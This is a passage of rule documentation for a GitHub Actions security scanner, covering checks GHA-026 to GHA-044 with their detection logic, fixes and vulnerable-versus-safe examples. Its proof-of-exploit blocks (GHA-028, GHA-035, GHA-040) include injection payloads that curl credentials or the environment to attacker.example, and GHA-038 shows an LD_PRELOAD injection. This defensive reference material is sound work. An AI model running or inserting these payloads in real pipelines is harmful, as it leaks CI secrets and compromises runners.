**How this is detected.** GitHub-hosted runners execute ``container:`` jobs inside a Docker container the runner itself manages, normally a hardened, network-namespaced sandbox. ``options:`` is a free-text passthrough to ``docker run``; a flag that breaks the sandbox (shares host network/PID, runs privileged, maps the Docker socket) turns the job into an RCE on the runner VM.

**Recommendation.** Remove ``--network host``, ``--privileged``, ``--cap-add``, ``--user 0``/``--user root``, ``--pid host``, ``--ipc host``, and host ``-v`` bind-mounts from ``container.options`` and ``services.*.options``. If a build genuinely needs one of these, move it to a dedicated self-hosted pool with branch protection so the flag doesn't reach PR runs.

**Source:** [`GHA-026`](../providers/github.md#gha-026) in the [GitHub Actions provider](../providers/github.md).

### `GHA-027`: Workflow contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-027 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context, [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Distinct from the hygiene checks. GHA-016 flags ``curl | bash`` as a risky default; this rule fires only on concrete indicators, reverse shells, base64-decoded execution, known miner binaries or pool URLs, exfil-channel domains, credential-dump pipes, history-erasure commands. Categories reported: ``obfuscated-exec``, ``reverse-shell``, ``crypto-miner``, ``exfil-channel``, ``credential-exfil``, ``audit-erasure``.

**Recommendation.** Treat this as a potential pipeline compromise. Inspect the matching step(s), identify the author and the PR that introduced them, rotate any credentials the workflow has access to, and audit CloudTrail/AuditLogs for exfil. If the match is a legitimate red-team exercise, whitelist via ``.pipelinecheckignore`` with an ``expires:`` date, never a permanent suppression.

**Known false positives.**

- Security-training repositories, CTF challenges, and red-team exercise workflows legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production workflow still fire.
- Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.

**Source:** [`GHA-027`](../providers/github.md#gha-027) in the [GitHub Actions provider](../providers/github.md).

### `GHA-028`: Dangerous shell idiom (eval, sh -c variable, backtick exec) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-028 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** ``eval``, ``sh -c "$X"``, and `` `$X` `` all re-parse the variable's value as shell syntax. If the value contains ``;``, ``&&``, ``|``, backticks, or ``$()``, those metacharacters execute. Even when the variable source looks controlled today, relocating the script or adding a new caller can silently expose it to untrusted input.

**Recommendation.** Replace ``eval "$VAR"`` / ``sh -c "$VAR"`` / backtick exec of variables with direct command invocation. If the command really must be dynamic, pass arguments as array members (``"${ARGS[@]}"``) or validate the input against an allow-list before invocation.

**Known false positives.**

- ``eval "$(ssh-agent -s)"`` and similar ``eval "$(<literal-tool> <literal-args>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd. The rule only fires when the substituted command references a variable.

**Proof of exploit.**

```
# Vulnerable: a PR-title-shaped env value is re-parsed as
# shell. A PR titled
#   ; curl -d @~/.aws/credentials https://attacker.example
# turns the eval line into a credential exfiltration step.
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - env:
          DEPLOY_CMD: ${{ github.event.pull_request.title }}
        run: eval "$DEPLOY_CMD"

# Safe: pass the value as data, not code. ``deploy`` reads
# stdin; metacharacters in the title stay literal.
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - env:
          DEPLOY_LABEL: ${{ github.event.pull_request.title }}
        run: ./scripts/deploy --label-from-env DEPLOY_LABEL
```

**Source:** [`GHA-028`](../providers/github.md#gha-028) in the [GitHub Actions provider](../providers/github.md).

### `GHA-029`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-029 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Package installs that pull from ``git+…`` without a pinned commit, from a local path (``./dir``, ``file:…``, absolute paths), or from a direct tarball URL are invisible to the normal lockfile integrity controls. A moving branch head, a sibling checkout the build assumes exists, or a tarball whose hash isn't verified all give an attacker who controls any of those surfaces the ability to substitute code into the build.

**Recommendation.** Pin git dependencies to a commit SHA (``pip install git+https://…/repo@<sha>``, ``cargo install --git … --rev <sha>``). Publish private packages to an internal registry instead of installing from a filesystem path or tarball URL.

**Source:** [`GHA-029`](../providers/github.md#gha-029) in the [GitHub Actions provider](../providers/github.md).

### `GHA-030`: OIDC token requested without environment-protected job <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-030 }

**Evidences:** [`ESF-D-TOKEN-HYGIENE`](#ctrl-esf-d-token-hygiene) Use short-lived, federated credentials (OIDC), not long-lived tokens, [`ESF-C-APPROVAL`](#ctrl-esf-c-approval) Require explicit approval before production deployment.

**How this is detected.** Pairs with IAM-008. IAM-008 verifies the AWS-side trust policy pins audience + subject; this rule verifies the GitHub-side workflow can't request the token from any branch without a deployment gate. A misconfiguration on either side defeats the OIDC story.

**Recommendation.** Bind every job that exchanges the GHA OIDC token for cloud credentials to a protected ``environment:`` (e.g. ``environment: production``). Environment protections layer in branch restrictions, required reviewers, and deployment windows that the IdP-side trust policy cannot enforce alone.

**Source:** [`GHA-030`](../providers/github.md#gha-030) in the [GitHub Actions provider](../providers/github.md).

### `GHA-031`: Workflow uses retired set-output / save-state command <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-031 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** GitHub deprecated ``::set-output::`` and ``::save-state::`` in October 2022 because they read from the runner's stdout as a control channel. Any tool whose output happens to contain ``::set-output…`` (a CI job's own diagnostic, a downloaded log, an upstream test framework) silently sets a step output. The replacement workflow commands (``$GITHUB_OUTPUT`` / ``$GITHUB_STATE`` files) close that injection channel. Workflows still using the retired commands also depend on a deprecation timer that GitHub has extended several times. They will eventually break.

**Recommendation.** Replace ``echo "::set-output name=X::$VALUE"`` with ``echo "X=$VALUE" >> "$GITHUB_OUTPUT"`` and ``echo "::save-state name=X::$VALUE"`` with ``echo "X=$VALUE" >> "$GITHUB_STATE"``. The old commands stream through the runner's stdout, which lets any log line that happens to start with ``::`` inject into the command channel. The file-redirect forms write to a private file the runner reads after the step exits, no log-line interleaving, no injection.

**Source:** [`GHA-031`](../providers/github.md#gha-031) in the [GitHub Actions provider](../providers/github.md).

### `GHA-032`: run: invokes local script on untrusted-trigger workflow <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-032 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** GHA-010 flags ``uses: ./action``, the *action* form of the same threat. This rule extends to direct shell invocation: ``run: ./scripts/setup.sh`` / ``run: bash scripts/setup.sh`` / ``run: python tools/build.py`` resolve against the checked-out workspace, which on ``pull_request_target`` / ``workflow_run`` is PR-controlled. The attacker ships an edited script and gets a default-branch-privileged shell.

**Recommendation.** Either don't run the script under an untrusted trigger, or split the workflow: keep the privileged work on the default branch (``push`` / ``release`` triggers, no PR fork content), and run untrusted-trigger steps in a separate workflow with no secrets and a minimal ``GITHUB_TOKEN`` scope. Pinning the script via ``uses: org/repo@<sha>`` from a separate trusted repo is the canonical fix.

**Known false positives.**

- Workflows that explicitly checkout a *trusted* ref (``ref: ${{ github.event.pull_request.base.sha }}`` or the default branch) before invoking the local script land the trusted bytes on disk, so the script body the PR ships is never executed. The rule has no checkout-graph analysis, it fires on any ``run: ./script`` under an untrusted trigger. Suppress per-workflow via ``--ignore-file`` once you've verified the checkout ref is anchored to a base-branch SHA; the safer pattern is still to split the workflow so secrets aren't in scope during the build half.

**Source:** [`GHA-032`](../providers/github.md#gha-032) in the [GitHub Actions provider](../providers/github.md).

### `GHA-033`: Secret value echoed / printed in a run: block <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-033 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Three shapes are flagged:

1. **Direct.** A printed argument references a secret context expression, e.g. ``echo "${{ secrets.X }}"`` or ``cat <<<${{ secrets.X }}``.
2. **Indirect env var.** A step ``env:`` block resolves a secret into the env (``X: ${{ secrets.X }}``) and the same step's ``run:`` echoes the env var (``echo "$X"``). Catches the lint-evading form where no ``${{ secrets...}}`` literal appears in the run body.
3. **Shell trace.** The step enables ``set -x`` / ``set -o xtrace`` AND references a secret-bound env var anywhere in the body. Shell trace mode dumps every command with arguments expanded before execution, so a ``curl -H "Bearer $TOKEN"`` line that would normally stay out of the log lands in the log verbatim. The rule fires once per step even though many lines may leak.

Out of scope (deliberate carve-out): inline secret references in a command's *arguments* without shell trace enabled. ``curl --header "Authorization: Bearer ${{ secrets.X }}"`` doesn't echo the header to stdout — the value goes to the network, not the log. That class of leak is covered by GHA-008 (literal credential in YAML) and the network-egress shape of GHA-057, not GHA-033. ``greylag-ci/cicd-goat`` scenario 15 sits squarely in this carve-out: a literal hex token in workflow ``env:`` plus a GET ``curl`` carrying the credential in an ``Authorization:`` header. GHA-008 fires on the literal; GHA-033 deliberately does not.

**Recommendation.** Don't print secret values from a script. GitHub's log redaction is a best-effort string match. It doesn't catch base64 / urlencoded / partial substrings, and any caller that retrieves the raw log via the API gets the unredacted stream. If you need to confirm the secret exists, log a boolean (``[ -n "$X" ] && echo set || echo unset``) or a fingerprint (``echo "$X" | sha256sum | head -c8``), never the value itself.

**Source:** [`GHA-033`](../providers/github.md#gha-033) in the [GitHub Actions provider](../providers/github.md).

### `GHA-034`: Reusable workflow called with secrets: inherit <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-034 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env, [`ESF-C-LEAST-PRIV`](#ctrl-esf-c-least-priv) Apply least-privilege to CI/CD service roles and pipelines.

**How this is detected.** Fires on a ``jobs.<id>.uses: ...`` reference whose sibling ``secrets:`` value is the literal string ``inherit``. This is distinct from GHA-025 (which gates on the *pin* of the called workflow): inheritance is a problem even when the call is SHA-pinned, because the surface a compromised callee sees is every caller secret instead of just the named ones. Explicit lists also document the contract, reviewers see exactly which secrets cross the workflow boundary.

**Recommendation.** Replace ``secrets: inherit`` with an explicit list of just the secrets the called workflow actually needs (``secrets: { NPM_TOKEN: ${{ secrets.NPM_TOKEN }} }``). ``inherit`` passes every secret the caller can see, including ones the downstream workflow has no business reading. A compromised or buggy reusable workflow can then exfiltrate credentials the caller never intended to share.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Single-tenant repos that share their entire secrets set with every reusable workflow by policy. Rare in practice, explicit lists make the secret flow visible and don't add much typing. Suppress with ``.pipelinecheckignore`` and a rationale rather than disabling the rule everywhere.

**Source:** [`GHA-034`](../providers/github.md#gha-034) in the [GitHub Actions provider](../providers/github.md).

### `GHA-035`: github-script step interpolates untrusted context <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-035 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** GHA-003 covers ``run:`` blocks where shell expansion is the injection surface. ``actions/github-script@<ref>`` runs the ``script:`` input as Node.js inside an authenticated Octokit context, same threat model, different language. The rule fires when ``script:`` (or the legacy ``previews:`` companion for inline JS) contains a ``${{ github.event.* }}``, ``${{ inputs.* }}``, ``${{ github.head_ref }}``, ``${{ github.ref_name }}``, or any other untrusted context expression, exactly the same catalog GHA-003 uses.

**Recommendation.** Pass attacker-controllable values through ``env:`` and read them inside the script via ``process.env.X`` instead of interpolating ``${{ ... }}`` directly into the script body. GitHub expands the expression *before* the JavaScript engine parses the source, so backticks, quotes, and ``${...}`` characters in the source field break out of the surrounding string and execute as JavaScript with the workflow's GITHUB_TOKEN in scope.

**Known false positives.**

- Scripts that interpolate ``${{ steps.*.outputs.* }}`` from a trusted upstream step are out of scope (the rule only matches the curated untrusted-context regex). If you intentionally rely on a non-curated context, suppress with a brief ``.pipelinecheckignore`` rationale.

**Proof of exploit.**

```
# Vulnerable: a PR title containing
#   `;require('child_process').execSync('curl https://attacker.example/-d "$(env)"');//
# closes the surrounding string, runs Node code against the
# workflow's GITHUB_TOKEN, and exfiltrates every env var.
jobs:
  comment:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@<sha>
        with:
          script: |
            const title = `${{ github.event.pull_request.title }}`;
            await github.rest.issues.createComment({ body: title });

# Safe: route the value through env so Node sees it as a
# string, never as JavaScript source.
jobs:
  comment:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@<sha>
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        with:
          script: |
            await github.rest.issues.createComment({
              body: process.env.PR_TITLE,
            });
```

**Source:** [`GHA-035`](../providers/github.md#gha-035) in the [GitHub Actions provider](../providers/github.md).

### `GHA-036`: runs-on interpolates untrusted context <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-036 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** GHA-012 catches self-hosted runners that aren't ephemeral; this rule catches the upstream targeting choice. When ``runs-on`` is computed from an untrusted expression, the caller picks where the workflow runs, including any self-hosted label the org owns. A reusable workflow that declares ``runs-on: ${{ inputs.runner }}`` lets a downstream caller route the job onto the production-deploy fleet (or any other privileged label) and execute arbitrary code with the privileges that fleet inherits. The same surface exists via ``workflow_dispatch`` inputs and any ``${{ github.event.* }}`` field that an attacker can populate. The rule walks all three ``runs-on`` shapes, string scalar, list of labels, and the long-form ``{ group, labels }`` dict, and matches the same untrusted-context regex GHA-003 / GHA-035 use.

**Recommendation.** Hard-code ``runs-on:`` to a specific runner label or list of labels. If the choice has to be parameterised across callers, validate the input against an allowlist of known-good labels before the job runs (a small ``if:`` guard at job level), and never accept ``${{ inputs.* }}`` or any ``${{ github.event.* }}`` field as the ``runs-on`` value directly.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Workflows that intentionally select runners by environment via a vetted matrix (``runs-on: ${{ matrix.os }}`` where ``matrix.os`` is a hard-coded list inside the workflow) are out of scope, the matrix values are author-controlled, not caller-controlled. The rule only matches the catalog of untrusted contexts (``inputs.*``, ``github.event.*``, ``github.head_ref``, …); ``matrix.*`` and ``env.*`` references are intentionally not flagged.

**Proof of exploit.**

```
# Vulnerable: workflow_dispatch input picks the runner. A
# caller who can dispatch the workflow picks ``prod-deploy``
# (or any other privileged self-hosted label the org owns)
# and the job runs with that fleet's inherited identity.
on:
  workflow_dispatch:
    inputs:
      runner:
        type: string
        required: true
jobs:
  run:
    runs-on: ${{ inputs.runner }}
    steps:
      - run: ./scripts/build

# Safe: pin to a hard-coded label. If the choice really has
# to be parameterised, validate the input against an
# allowlist at job-level via a small if: guard before any
# step runs.
on: { workflow_dispatch: {} }
jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - run: ./scripts/build
```

**Source:** [`GHA-036`](../providers/github.md#gha-036) in the [GitHub Actions provider](../providers/github.md).

### `GHA-037`: actions/checkout persists GITHUB_TOKEN into .git/config <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-037 }

**Evidences:** [`ESF-D-TOKEN-HYGIENE`](#ctrl-esf-d-token-hygiene) Use short-lived, federated credentials (OIDC), not long-lived tokens.

**How this is detected.** Detection fires on any step whose ``uses:`` starts with ``actions/checkout@`` and whose ``with:`` block either omits ``persist-credentials`` (the unsafe default) or sets it to ``true`` explicitly.

This is the failure pattern Zizmor calls *Artipacked* and the StepSecurity / harden-runner audit set tracks as ``persist-credentials``-default. Real-world exploit chains (the ``ultralytics`` 2024 RCE, multiple Mend / Snyk advisories) exploit exactly this primitive: a first checkout step persists the token, a later ``run:`` step (often a build script the attacker can influence via PR contents) reads ``.git/config`` and ships the token out.

Sister rule: GHA-019 catches the explicit ``echo $GITHUB_TOKEN > file`` shape; GHA-037 catches the implicit checkout-default that doesn't go through a ``run:`` line at all.

**Recommendation.** Set ``persist-credentials: false`` on every ``actions/checkout`` step that doesn't need to push back to the repo. The default in v3 / v4 is ``true``, which writes the GITHUB_TOKEN into ``.git/config`` as an ``http.https://github.com/.extraheader`` line. Any subsequent ``run:`` step in the same job can read it with ``git config --get http.https://github.com/.extraheader`` and exfiltrate the token to a remote endpoint, even if that step's own scope is read-only. If the workflow genuinely needs to push (release publishing, doc-site deploys), do the push as the very next step and immediately follow with a checkout that sets ``persist-credentials: false`` so the token doesn't leak into later, less-trusted steps.

**Known false positives.**

- Workflows that genuinely need ``persist-credentials: true`` to push back to the repo (a release-tag bot, a docs-deploy job, ``stefanzweifel/git-auto-commit-action``) shouldn't suppress this rule globally; instead, scope ``persist-credentials: true`` to a named step, then run the push immediately, then use a fresh ``actions/checkout`` with ``persist-credentials: false`` so the token doesn't leak into later steps. Suppress on the specific step name only when the scoped pattern is in place.

**Source:** [`GHA-037`](../providers/github.md#gha-037) in the [GitHub Actions provider](../providers/github.md).

### `GHA-038`: Workflow re-enables retired ::set-env / ::add-path commands <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-038 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** Detection fires when ``ACTIONS_ALLOW_UNSECURE_COMMANDS`` is set to any truthy value at the workflow ``env:`` level, the job ``env:`` level, or any step's ``env:`` block. Accepted truthy spellings: ``true`` / ``1`` / ``yes`` / ``on`` (including quoted forms like ``"true"`` and case-insensitive variants like ``YES`` / ``On``).

Sister rule GHA-031 catches direct uses of ``::set-output::`` / ``::save-state::`` in step scripts. GHA-038 catches the explicit re-enable flag, which is the strictly worse case: it implicitly accepts every ``::set-env::`` / ``::add-path::`` line that lands on the runner's stdout from any tool the step invokes, not just the workflow author's own ``echo`` commands. A downloaded build log, a container's startup banner, an upstream test runner's output, all become injection vectors.

**Recommendation.** Drop the ``ACTIONS_ALLOW_UNSECURE_COMMANDS`` env definition entirely, then migrate any leftover ``::set-env::`` / ``::add-path::`` workflow commands to the file-redirect form (``echo "X=$VAL" >> "$GITHUB_ENV"`` and ``echo "$DIR" >> "$GITHUB_PATH"``). GitHub disabled the legacy commands in 2020 specifically because they share the runner's stdout as a control channel: any log line starting with ``::`` could inject environment variables, prepend to PATH, or set step outputs. Setting the override flag back to ``true`` re-opens that injection channel for the entire workflow scope.

**Known false positives.**

- Some legacy actions (last-updated pre-2020) still emit ``::set-env::`` lines and rely on the override to be set. Replace the action rather than suppressing this rule, the security exposure outweighs the cost of an alternative action.

**Proof of exploit.**

```
# Vulnerable: the workflow re-enables the retired command
# channel. Any tool output containing ``::set-env::`` (a
# build log, a downloaded artifact, an upstream test runner)
# now injects environment variables into subsequent steps.
# A printed line
#   ::set-env name=LD_PRELOAD::/tmp/x.so
# from a compromised transitive dep silently rewires the
# linker on the next ``run:`` step.
jobs:
  build:
    runs-on: ubuntu-latest
    env:
      ACTIONS_ALLOW_UNSECURE_COMMANDS: "true"
    steps:
      - uses: actions/checkout@<sha>
      - run: ./scripts/build

# Safe: don't set the override; use the file-redirect form
# for any env / PATH mutation the workflow legitimately needs.
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - run: |
          echo "BUILD_TAG=$(git rev-parse --short HEAD)" >> "$GITHUB_ENV"
      - run: ./scripts/build
```

**Source:** [`GHA-038`](../providers/github.md#gha-038) in the [GitHub Actions provider](../providers/github.md).

### `GHA-039`: services / container credentials embedded as literal in workflow <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-039 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** GitHub Actions accepts a ``credentials:`` map on both the job-level ``container:`` block (the runner image) and on each ``services.<name>:`` entry (sidecar containers). The map is the documented way to pull a private image from a registry that requires auth, and it expects ``${{ secrets.* }}`` references for both fields.

GHA-008 scans the workflow for credential **patterns** (AWS access keys, JWTs, Slack tokens, etc.) but doesn't trip on a plain password like ``hunter2`` or a registry username like ``ci-deploy-bot``. GHA-039 catches them by **position**: any literal value in a ``credentials.username`` / ``credentials.password`` field is by definition a leaked credential, regardless of its shape. Closes parity with Zizmor's ``hardcoded-container-credentials`` rule.

**Recommendation.** Move every ``services.<name>.credentials.username`` / ``credentials.password`` value (and the same field on a job-level ``container:`` block) out of the workflow YAML and into a repository or environment secret. Reference the secret via ``${{ secrets.NAME }}`` from the same credentials block. Anything written as a literal is permanently visible in every fork of the repo, every build log that prints the runner's start banner, and every cached job summary, so the credential must be treated as compromised on the spot. The fix is the rotation, plus the secret reference, plus a check that no other workflow keeps the literal pattern.

**Known false positives.**

- Workflows that legitimately use a public anonymous registry mirror occasionally hardcode ``username: anonymous`` / ``password: ""`` for clarity. Both shapes are filtered out automatically (empty / whitespace-only values, plus the literal ``anonymous`` username), but if your fixture uses another sentinel for anonymous access, suppress the specific job/service in the ignore-file rather than the rule globally.

**Source:** [`GHA-039`](../providers/github.md#gha-039) in the [GitHub Actions provider](../providers/github.md).

### `GHA-040`: Action reference matches a known-compromised SHA or tag <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-040 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-VULN-MGMT`](#ctrl-esf-s-vuln-mgmt) Scan inbound artifacts (images, packages) for known vulnerabilities.

**How this is detected.** Walks every workflow's ``steps[].uses:`` and ``jobs.<id>.uses:`` references against the curated compromised-action registry in ``pipeline_check.core.checks.github._compromised_actions``. Match is case-insensitive on owner / repo and exact on the ``ref`` value (commit SHA or tag name). Registry is deliberately small and append-only — refresh by PR with the citing advisory in the commit message; no fetch-from-network registry to avoid taking on a telemetry surface.

**Recommendation.** Rotate every secret that may have been reachable to a workflow run that hit the compromised reference, then update the ``uses:`` reference to a known-clean SHA published by the upstream maintainer post-incident (usually announced in the advisory body). Audit CI logs for the affected window for any sign that the malicious payload ran against this repo.

**Known false positives.**

- The registry covers only public, advisory-confirmed compromises. Pre-disclosure compromises and yet-unpublished maintainer-account takeovers do not land until the citing CVE / GHSA exists. Pair with GHA-001 (SHA pinning) and GHA-025 (tag-rewrite detection) for the prevention angle.

**Seen in the wild.**

- tj-actions/changed-files compromise ([CVE-2025-30066](https://www.cve.org/CVERecord?id=CVE-2025-30066), March 2025): the canonical case the registry was built for. Roughly 23,000 tag-pinned repos shipped CI secrets to an exfiltration endpoint over a ~24-hour window before GitHub blocked the malicious commits.
- reviewdog/action-setup compromise ([CVE-2025-30154](https://www.cve.org/CVERecord?id=CVE-2025-30154), March 2025): same week as tj-actions; smaller blast radius but identical mechanism. Tag-pinned consumers were affected; SHA-pinned consumers who happened to match the malicious commit were also affected.

**Proof of exploit.**

```
# Vulnerable: pinned to a SHA the attacker landed under @v45.
# (Substitute the actual malicious-commit SHA from the CVE-2025-30066
# advisory; the registry in _compromised_actions.py carries it.)
- uses: tj-actions/changed-files@<advisory-malicious-sha>

# Same applies to tag pins that resolved to the malicious
# commit during the compromise window:
- uses: tj-actions/changed-files@v45     # WAS pointing at the bad commit

# Attack: the injected action body exfiltrated CI secrets by
# dumping the runner process environment to a controlled host:
#   curl -X POST https://attacker.example/exfil \
#     -d "$(cat /proc/self/environ)"
#
# Every workflow run that hit one of those refs over the
# compromise window leaked the entire env block, including
# ${{ secrets.* }} and GITHUB_TOKEN.

# Safe: pin to the post-incident clean SHA the maintainer
# republished in the advisory (consult the GHSA the registry
# cites for the exact value):
- uses: tj-actions/changed-files@<advisory-clean-sha>
```

**Source:** [`GHA-040`](../providers/github.md#gha-040) in the [GitHub Actions provider](../providers/github.md).

### `GHA-041`: Action upstream repo has a single contributor <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-041 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Reads the contributor count from ``ctx.action_metadata[owner/repo].contributor_count`` (populated by the ``--resolve-remote`` path; the GitHub REST ``/contributors`` endpoint, capped at two entries — the rule only cares about == 1). When the fetch failed or the flag is off, the rule passes silently. Forks and archived repos that ALSO have a single contributor fire the rule; the fork / archived state is part of the same supply-chain risk story.

**Recommendation.** Audit the action repo's contributor list. If the repo genuinely has one maintainer, pin to a vendored fork under your org's control (so a future compromise on the upstream doesn't reach your build runtime) or move to a first-party action covering the same surface. The single-maintainer pattern is what made tj-actions / reviewdog one-day compromises so widely-blast.

**Known false positives.**

- Some well-maintained single-author actions (high-quality personal-account repos that the maintainer simply hasn't open-sourced governance for) are not actually compromised. Suppress via ignore-file when a security review has confirmed the maintainer's identity and 2FA posture.

**Seen in the wild.**

- tj-actions / reviewdog March 2025 compromises (CVE-2025-30066 / CVE-2025-30154): both upstream repos had a single primary contributor at the time of compromise. The single-maintainer pattern was central to the blast radius (no second pair of eyes on the malicious commit, no auto-rollback when the tag move landed).

**Source:** [`GHA-041`](../providers/github.md#gha-041) in the [GitHub Actions provider](../providers/github.md).

### `GHA-042`: Action upstream repo is newly created <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-042 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Reads ``created_at`` from ``ctx.action_metadata[owner/repo]`` (populated by the ``--resolve-remote`` path). Fires when the repo's age in days is below ``MIN_AGE_DAYS`` (90). Without the opt-in flag the rule passes silently with a nudge.

**Recommendation.** Verify the action repo is the real upstream and not a typosquat. Compare the spelling and owner against the intended action (``actions/checkout`` vs ``actoins/checkout``); check the repo description, stars, and prior releases. If the action is genuinely new but trusted, suppress via ignore-file with a dated note; the suppression decays naturally as the repo ages past the 90-day threshold.

**Known false positives.**

- Newly-released first-party actions from a trusted org (say, a freshly-launched ``actions/foo`` rolled out by GitHub itself) fire while they're still young. Suppress via ignore-file with a dated note; the entry expires naturally once the repo crosses the age threshold.

**Seen in the wild.**

- GitGuardian / StepSecurity typosquat reports (2023-2024) document several action-naming impersonations that appeared as newly-registered repos and reached production CI before the legitimate owner was notified.

**Source:** [`GHA-042`](../providers/github.md#gha-042) in the [GitHub Actions provider](../providers/github.md).

### `GHA-043`: Low-star action runs with sensitive permissions <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-043 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-C-LEAST-PRIV`](#ctrl-esf-c-least-priv) Apply least-privilege to CI/CD service roles and pipelines.

**How this is detected.** Reads ``stargazers_count`` from ``ctx.action_metadata[owner/repo]`` and the effective ``permissions:`` block (job-level wins; falls back to workflow-top-level; falls back to the caller's inherited block for resolved reusable workflows). Fires when stars < ``MAX_STARS`` (25) AND any of 'contents', 'packages', 'id-token', 'actions', 'deployments' is set to ``write`` on the calling job. ``permissions: write-all`` is treated as all scopes set to write.

**Recommendation.** Either narrow the calling job's ``permissions:`` to the minimum the action actually needs (drop ``contents: write`` / ``id-token: write`` / ``packages: write`` / ``actions: write`` / ``deployments: write`` unless the action's documented surface requires them), or replace the action with a community-reviewed alternative. The rule fires the COMBINATION of low community review and elevated permissions; either side alone is fine.

**Known false positives.**

- Internal first-party actions hosted in a private org repo legitimately have low public star counts; their threat model is different and the rule does not distinguish internal from third-party. Suppress via ignore-file when the action is in-org and trusted.

**Seen in the wild.**

- GitGuardian 2023 supply-chain audit: a handful of low-popularity actions with ``contents: write`` were weaponized via single-PR maintainer-impersonation compromises; the elevated permission was the privilege amplifier that let the attacker push code back to the victim's default branch on the same workflow run.

**Source:** [`GHA-043`](../providers/github.md#gha-043) in the [GitHub Actions provider](../providers/github.md).

### `GHA-044`: Build tool runs lifecycle scripts on untrusted-trigger workflow <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-044 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** Package managers and build tools execute code by design. ``npm install`` / ``pnpm install`` / ``yarn`` / ``bun install`` run ``preinstall`` / ``install`` / ``postinstall`` / ``prepare`` from the PR's ``package.json``; ``deno install`` resolves the PR's ``deno.json`` / ``package.json`` and (when ``--allow-scripts`` opts in) runs the same npm lifecycle hooks; ``pip install .`` runs the PR's ``setup.py``; ``make`` runs the PR's ``Makefile``; ``mvn`` / ``gradle`` load plugins declared in the PR's ``pom.xml`` / ``build.gradle``; ``cargo build`` runs ``build.rs``. Under ``pull_request_target`` / ``workflow_run``, the surrounding context already has secrets and a write-scope token, so the lifecycle hook is the entire attack.

